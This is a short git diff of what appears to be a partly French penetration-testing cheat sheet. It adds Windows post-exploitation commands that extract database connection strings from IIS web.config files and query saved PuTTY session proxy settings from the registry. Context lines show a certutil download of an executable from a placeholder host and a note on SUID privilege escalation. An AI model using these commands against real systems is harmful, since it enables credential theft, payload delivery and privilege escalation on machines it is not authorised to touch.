@@ -70,14 +70,21 @@ _______________________________ /\
 
 [CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
 ```
-# Windows IIS Configuration
+# Windows : IIS Configuration
 ![image](https://user-images.githubusercontent.com/97956863/231268829-26242927-066f-47be-a4c4-cab613374d7f.png)
 
-```
+    C:\inetpub\wwwroot\web.config
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 
 ```
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
 
-
+# Windows : PuTTY
+```
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+#Il est important de garder SimonTatham car c'est le créateur de PuTTY ! 
+```
 -------------------------------------------------------------------------------------------------------------------------------------------+
 <br>
 [?] Using "-p" on an SUID file will run it with the permission of the owner. Ex if root own a file and you run it (non-root) using "-p" you will run it with root perm
